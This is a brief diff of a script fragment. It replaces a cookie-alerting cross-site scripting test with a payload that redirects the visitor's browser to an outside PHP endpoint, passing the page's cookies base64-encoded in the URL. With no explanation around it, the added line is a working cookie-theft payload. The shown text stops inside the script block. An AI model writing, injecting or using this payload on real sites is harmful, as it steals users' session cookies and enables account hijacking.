@@ -1,3 +1,3 @@
-<script>
-	var i = new Image();
-	i.src = "i.jpg" + alert(document.cookie);
+<script type="text/javascript">
+			document.location='https://codefoxdev.com/cookie.php?c='+encodeURIComponent(btoa(document.cookie));
+		
